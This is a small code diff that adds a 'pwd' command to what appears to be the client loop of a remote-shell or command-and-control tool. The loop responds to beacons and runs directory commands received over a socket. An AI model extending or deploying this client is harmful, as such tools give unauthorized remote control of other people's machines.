@@ -150,6 +150,8 @@ def clientLoop():
                 s.send("beacon_pong".encode())
             elif command == "SERVER_SHUTDOWN":
                 break
+            elif command == "pwd":
+                s.send(str(os.getcwd()))
             elif splitted_command[0] == "cd": #if the user wants to change directories
                 try:
                     os.chdir(' '.join(splitted_command[1:])) #use os to change the directory
